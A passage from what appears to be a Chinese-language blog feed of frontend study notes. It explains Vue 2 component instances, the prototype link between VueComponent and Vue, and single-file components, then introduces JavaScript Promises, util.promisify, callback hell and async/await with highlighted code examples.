它们的this均是【VueComponent实例对象】。</li><li>(2).new Vue(options)配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。</li></ul></li><li>5.VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。Vue的实例对象，以后简称vm。<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">school</span>&gt;</span><span class="tag">&lt;/<span class="name">school</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">hello</span>&gt;</span><span class="tag">&lt;/<span class="name">hello</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">//定义school组件</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> school = <span class="title class_">Vue</span>.<span class="title function_">extend</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">name</span>:<span class="string">&#x27;school&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">template</span>:<span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;h2&gt;学校名称：&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;h2&gt;学校地址：&#123;&#123;address&#125;&#125;&lt;/h2&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;button @click=&quot;showName&quot;&gt;点我提示学校名&lt;/button&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;/div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">`</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">address</span>:<span class="string">&#x27;北京&#x27;</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">showName</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;showName&#x27;</span>,<span class="variable language_">this</span>)</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> test = <span class="title class_">Vue</span>.<span class="title function_">extend</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">template</span>:<span class="string">`&lt;span&gt;atguigu&lt;/span&gt;`</span></span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">//定义hello组件</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> hello = <span class="title class_">Vue</span>.<span class="title function_">extend</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">template</span>:<span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;h2&gt;&#123;&#123;msg&#125;&#125;&lt;/h2&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;test&gt;&lt;/test&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;/div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">`</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">msg</span>:<span class="string">&#x27;你好啊！&#x27;</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">components</span>:&#123;test&#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// console.log(&#x27;@&#x27;,school)</span></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// console.log(&#x27;#&#x27;,hello)</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">//创建vm</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">components</span>:&#123;school,hello&#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="内置关系"><a href="#内置关系" class="headerlink" title="内置关系"></a>内置关系</h3><ul><li>1.一个重要的内置关系：VueComponent.prototype.<strong>proto</strong> === Vue.prototype</li><li>2.为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">school</span>&gt;</span><span class="tag">&lt;/<span class="name">school</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Vue</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">x</span> = <span class="number">99</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">//定义school组件</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> school = <span class="title class_">Vue</span>.<span class="title function_">extend</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">name</span>:<span class="string">&#x27;school&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">template</span>:<span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;h2&gt;学校名称：&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;h2&gt;学校地址：&#123;&#123;address&#125;&#125;&lt;/h2&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;button @click=&quot;showX&quot;&gt;点我输出x&lt;/button&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;/div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">`</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">address</span>:<span class="string">&#x27;北京&#x27;</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">showX</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">x</span>)</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">//创建一个vm</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">msg</span>:<span class="string">&#x27;你好&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">components</span>:&#123;school&#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">//定义一个构造函数</span></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">/* function Demo()&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">      this.a = 1</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">      this.b = 2</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">  &#125;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">  //创建一个Demo的实例对象</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">  const d = new Demo()</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">  console.log(Demo.prototype) //显示原型属性</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">  console.log(d.__proto__) //隐式原型属性</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">  console.log(Demo.prototype === d.__proto__)</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">  //程序员通过显示原型属性操作原型对象，追加一个x属性，值为99</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">  Demo.prototype.x = 99</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">  console.log(&#x27;@&#x27;,d) */</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="单文件组件"><a href="#单文件组件" class="headerlink" title="单文件组件"></a>单文件组件</h2><ul><li>.vue只支持三个标签：template，script，style</li><li>组件：实现局部功能代码和资源的集合</li><li><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--安装Vetur插件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--组件的结构--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 组件交互相关的代码（数据、方法等）</span></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 引入当前文件需要使用import，这里需要该组件暴露需要引入内容</span></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">  * 暴露有三种方式</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">  *  1、分别暴露：export const x = &#x27;&#x27;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">  *     引入：import &#123;???&#125; from ???</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">  *  2、统一暴露：const x = &#x27;&#x27;; export &#123;x&#125;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">  *     引入：import &#123;???&#125; from ???</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">  *  3、默认暴露：const x = &#x27;&#x27;; export default x</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">  *     引入：import ??? from ???    </span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">  * */</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="comment">/*组件的样式*/</span></span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Vue2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Promise</title>
      <link href="/2022/06/30/Promise/"/>
      <url>/2022/06/30/Promise/</url>
      
        <content type="html"><![CDATA[<h1 id="Promise介绍"><a href="#Promise介绍" class="headerlink" title="Promise介绍"></a>Promise介绍</h1><h2 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h2><h3 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h3><ul><li><p>抽象表达</p><ul><li>Promise 是 JS 中进行<code>异步编程</code>的新解决方案，旧方案是单纯使用<code>回调函数</code></li></ul></li><li><p>具体表达</p><ul><li>从语法上：Promise 是一个<code>构造函数</code></li><li>从功能上：promise 对象用来封装一个<code>异步操作</code>并可以获取其成功/失败的<code>结果值</code></li></ul></li><li><p>异步编程</p><ul><li>fs 文件操作<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readFile</span>(<span class="string">&#x27;./index.html&#x27;</span>, <span class="function">(<span class="params">err,data</span>)=&gt;</span>&#123;&#125;)</span><br></pre></td></tr></table></figure></li><li>数据库操作</li><li>AJAX<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$.<span class="title function_">get</span>(<span class="string">&#x27;/server&#x27;</span>, <span class="function">(<span class="params">data</span>)=&gt;</span>&#123;&#125;)</span><br></pre></td></tr></table></figure></li><li>定时器<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;&#125;, <span class="number">2000</span>);</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="promise-的状态"><a href="#promise-的状态" class="headerlink" title="promise 的状态"></a>promise 的状态</h3><p><code>promise状态:promise实例对象的一个属性，属性名：promiseState，属性是内置的，不能直接对属性进行操作</code></p><ul><li>promiseState的值有以下三种<ul><li>pending  未决定的，初始化的默认值</li><li>resolved / fulfilled  成功</li><li>rejected  失败</li></ul></li></ul><h3 id="promise-的状态改变"><a href="#promise-的状态改变" class="headerlink" title="promise 的状态改变"></a>promise 的状态改变</h3><ul><li><ol><li>pending 变为 <code>resolved</code></li></ol></li><li><ol start="2"><li>pending 变为 <code>rejected</code></li></ol><ul><li>说明: 只有这 2 种, 且一个 promise 对象只能<code>改变一次</code></li><li>无论变为成功还是失败, 都会有一个<code>结果数据</code></li><li>成功的结果数据一般称为 <code>value</code>, 失败的结果数据一般称为 <code>reason</code></li></ul></li></ul><h3 id="Promise-对象的值"><a href="#Promise-对象的值" class="headerlink" title="Promise 对象的值"></a>Promise 对象的值</h3><p><code>实例对象中的另一个属性 『PromiseResult』</code></p><ul><li>保存着异步任务『成功/失败』的结果，resolve和reject可以修改实例对象中的PromiseResult的值<ul><li>resolve</li><li>reject</li></ul></li></ul><h3 id="promise-的基本流程"><a href="#promise-的基本流程" class="headerlink" title="promise 的基本流程"></a>promise 的基本流程</h3><ul><li>new promise()创建一个对象，在promise内部封装异步操作<ul><li>如果异步操作成功，则调用resolve()函数，resolve()函数调用将promise对象状态改为成功（fulfilled），成功调then方法时将调用第一参数，即第一个回调函数中的代码，然后返回一个新的promise对象</li><li>如果异步操作失败，则调用reject()函数，reject()函数调用将promise对象状态改为失败（rejected），失败调then/catch方法时将调用第二参数，即第二个回调函数中的代码，然后返回一个新的promise对象</li></ul></li></ul><p><img src="/images/promise%E6%B5%81%E7%A8%8B.jpg" alt="Image text"></p><h3 id="promise的基本使用"><a href="#promise的基本使用" class="headerlink" title="promise的基本使用"></a>promise的基本使用</h3><ul><li>实例1<ul><li>点击按钮,  1s 后显示是否中奖(30%概率中奖)<ul><li>若中奖弹出    恭喜恭喜, 奖品为 10万 RMB 劳斯莱斯优惠券</li><li>若未中奖弹出  再接再厉</li></ul></li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//生成随机数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">rand</span>(<span class="params">m,n</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">ceil</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * (n-m+<span class="number">1</span>)) + m-<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> 点击按钮,  1s 后显示是否中奖(30%概率中奖)</span></span><br><span class="line"><span class="comment"> 若中奖弹出    恭喜恭喜, 奖品为 10万 RMB 劳斯莱斯优惠券</span></span><br><span class="line"><span class="comment"> 若未中奖弹出  再接再厉</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="comment">//获取元素对象</span></span><br><span class="line"><span class="keyword">const</span> btn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#btn&#x27;</span>);</span><br><span class="line"><span class="comment">//绑定单击事件</span></span><br><span class="line">btn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//定时器</span></span><br><span class="line">    <span class="comment">// setTimeout(() =&gt; &#123;</span></span><br><span class="line">    <span class="comment">//     //30%  1-100  1 2 30</span></span><br><span class="line">    <span class="comment">//     //获取从1 - 100的一个随机数</span></span><br><span class="line">    <span class="comment">//     let n = rand(1, 100);</span></span><br><span class="line">    <span class="comment">//     //判断</span></span><br><span class="line">    <span class="comment">//     if(n &lt;= 30)&#123;</span></span><br><span class="line">    <span class="comment">//         alert(&#x27;恭喜恭喜, 奖品为 10万 RMB 劳斯莱斯优惠券&#x27;);</span></span><br><span class="line">    <span class="comment">//     &#125;else&#123;</span></span><br><span class="line">    <span class="comment">//         alert(&#x27;再接再厉&#x27;);</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;, 1000);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//Promise 形式实现</span></span><br><span class="line">    <span class="comment">// resolve 解决  函数类型的数据</span></span><br><span class="line">    <span class="comment">// reject  拒绝  函数类型的数据</span></span><br><span class="line">    <span class="comment">// 1) 创建 promise 对象(pending 状态), 指定执行器函数</span></span><br><span class="line">    <span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 2) 在执行器函数中启动异步任务</span></span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">//30%  1-100  1 2 30</span></span><br><span class="line">            <span class="comment">//获取从1 - 100的一个随机数</span></span><br><span class="line">            <span class="keyword">let</span> n = <span class="title function_">rand</span>(<span class="number">1</span>, <span class="number">100</span>);</span><br><span class="line">            <span class="comment">//判断</span></span><br><span class="line">            <span class="comment">// 3) 根据结果做不同处理</span></span><br><span class="line">            <span class="comment">// 3.1) 如果成功了, 调用 resolve(), 指定成功的 value, 变为 resolved 状 态</span></span><br><span class="line">            <span class="keyword">if</span>(n &lt;= <span class="number">30</span>)&#123;</span><br><span class="line">                <span class="title function_">resolve</span>(n); <span class="comment">// 将 promise 对象的状态设置为 『成功』</span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">// 3.2) 如果失败了, 调用 reject(), 指定失败的 reason, 变为rejected 状态</span></span><br><span class="line">                <span class="title function_">reject</span>(n); <span class="comment">// 将 promise 对象的状态设置为 『失败』</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="number">1000</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(p);</span><br><span class="line">    <span class="comment">//调用 then 方法</span></span><br><span class="line">    <span class="comment">// value 值</span></span><br><span class="line">    <span class="comment">// reason 理由</span></span><br><span class="line">    <span class="comment">// 4) 能 promise 指定成功或失败的回调函数来获取成功的 value 或失败的 reason</span></span><br><span class="line">    p.<span class="title function_">then</span>(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123; <span class="comment">// 成功的回调函数 onResolved, 得到成功的 vlaue</span></span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&#x27;恭喜恭喜, 奖品为 10万 RMB 劳斯莱斯优惠券, 您的中奖数字为 &#x27;</span> + value);</span><br><span class="line">    &#125;, <span class="function">(<span class="params">reason</span>) =&gt;</span> &#123; <span class="comment">// 失败的回调函数 onRejected, 得到失败的 reason</span></span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&#x27;再接再厉, 您的号码为 &#x27;</span> + reason);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="util-promisify方法"><a href="#util-promisify方法" class="headerlink" title="util.promisify方法"></a>util.promisify方法</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * util.promisify 方法</span></span><br><span class="line"><span class="comment"> * node.js中内置的方法promisify，promisify方法属于util模块的</span></span><br><span class="line"><span class="comment"> * 作用会返回一个错误优先的回调风格的函数（即以（err, value）=&gt; &#123;&#125; 回调最为最后一个参数），并返回一个promise的版本</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//引入 util 模块</span></span><br><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">&#x27;util&#x27;</span>);</span><br><span class="line"><span class="comment">//引入 fs 模块</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="comment">//返回一个新的函数，函数调用后返回的结果就是promise对象</span></span><br><span class="line"><span class="keyword">let</span> mineReadFile = util.<span class="title function_">promisify</span>(fs.<span class="property">readFile</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">mineReadFile</span>(<span class="string">&#x27;./resource/content.txt&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">value</span>=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(value.<span class="title function_">toString</span>());</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="为什么使用Promise"><a href="#为什么使用Promise" class="headerlink" title="为什么使用Promise"></a>为什么使用Promise</h2><h3 id="指定回调函数的方式更加灵活"><a href="#指定回调函数的方式更加灵活" class="headerlink" title="指定回调函数的方式更加灵活"></a>指定回调函数的方式更加灵活</h3><ul><li>旧的: 必须在启动异步任务前指定</li><li>promise: 启动异步任务 =&gt; 返回promie对象 =&gt; 给promise对象绑定回调函数(甚至可以在异步任务结束后指定多个)</li></ul><h3 id="支持链式调用-可以解决回调地狱问题"><a href="#支持链式调用-可以解决回调地狱问题" class="headerlink" title="支持链式调用, 可以解决回调地狱问题"></a>支持链式调用, 可以解决回调地狱问题</h3><ul><li><p>回调地狱：回调函数嵌套调用, 外部回调函数异步执行的结果是嵌套的回调执行的条件（一个回调函数中嵌套着另一个异步任务），特点：代码会不断的向前缩进<br><img src="/images/%E5%9B%9E%E8%B0%83%E5%9C%B0%E7%8B%B1.jpg" alt="Image text"></p></li><li><p>回调地狱的缺点</p><ul><li>不便于阅读</li><li>不便于异常处理</li></ul></li><li><p>解决方案</p><ul><li>promise 链式调用</li></ul></li><li><p>终极解决方案</p><ul><li>async/await</li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 成功的回调函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">successCallback</span>(<span class="params">result</span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;声音文件创建成功: &quot;</span> + result);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 失败的回调函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">failureCallback</span>(<span class="params">error</span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;声音文件创建失败: &quot;</span> + error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 1.1 使用纯回调函数 */</span></span><br><span class="line"><span class="title function_">createAudioFileAsync</span>(audioSettings, successCallback, failureCallback)</span><br><span class="line"><span class="comment">/* 1.2. 使用 Promise */</span></span><br><span class="line"><span class="keyword">const</span> promise = <span class="title function_">createAudioFileAsync</span>(audioSettings); <span class="comment">// 2</span></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  promise.<span class="title function_">then</span>(successCallback, failureCallback);</span><br><span class="line">&#125;, <span class="number">3000</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">2.1. 回调地狱</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_">doSomething</span>(<span class="keyword">function</span>(<span class="params">result</span>) &#123;</span><br><span class="line">  <span class="title function_">doSomethingElse</span>(result, <span class="keyword">function</span>(<span class="params">newResult</span>) &#123;</span><br><span class="line">    <span class="title function_">doThirdThing</span>(newResult, <span class="keyword">function</span>(<span class="params">finalResult</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Got the final result: &#x27;</span> + finalResult)</span><br><span class="line">    &#125;, failureCallback)</span><br><span class="line">  &#125;, failureCallback)</span><br><span class="line">&#125;, failureCallback)</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">2.2. 使用 promise 的链式调用解决回调地狱</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_">doSomething</span>().<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">result</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">doSomethingElse</span>(result)</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">newResult</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">doThirdThing</span>(newResult)</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">finalResult</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Got the final result: &#x27;</span> + finalResult)</span><br><span class="line">&#125;).<span class="title function_">catch</span>(failureCallback)</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">2.3. async/await: 回调地狱的终极解决方案</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">request</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> result = <span class="keyword">await</span> <span class="title function_">doSomething</span>()</span><br><span class="line">    <span class="keyword">const</span> newResult = <span class="keyword">await</span> <span class="title function_">doSomethingElse</span>(result)</span><br><span class="line">    <span class="keyword">const</span> finalResult = <span class="keyword">await</span> <span class="title function_">doThirdThing</span>(newResult)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Got the final result: &#x27;</span> + finalResult) &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="title function_">failureCallback</span>(error) </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="如何使用-Promise"><a href="#如何使用-Promise" class="headerlink" title="如何使用 Promise?"></a>如何使用 Promise?</h2><h3 id="API"><a href="#API" class="headerlink" 